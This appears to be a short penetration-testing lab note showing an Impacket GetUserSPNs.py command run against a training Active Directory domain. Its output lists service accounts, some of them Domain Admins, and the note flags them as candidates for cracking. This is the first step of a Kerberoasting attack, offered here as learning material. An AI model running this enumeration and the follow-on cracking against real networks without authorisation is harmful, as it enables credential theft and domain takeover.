Pulled a listing of SPN accounts. Need to dig in further and see if any are crackable.

```bash
sudo GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/asmith
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                           Name               MemberOf                                                   PasswordLastSet             LastLogon  Delegation 
---------------------------------------------  -----------------  ---------------------------------------------------------  --------------------------  ---------  ----------
sts/inlanefreight.local                        solarwindsmonitor  CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL        2022-06-01 23:11:38.041017  <never>               
MSSQLSvc/SPSJDB.inlanefreight.local:1433       sqlprod            CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL         2022-06-01 23:11:50.431638  <never>               
MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433  sqldev             CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL        2022-06-01 23:12:06.009772  <never>               
vmware/inlanefreight.local                     svc_vmwaresso                                                                 2022-06-01 23:13:09.494156  <never>               
SAPService/srv01.inlanefreight.local           SAPService         CN=Account Operators,CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL  2022-06-01 23:13:25.041019  <never> 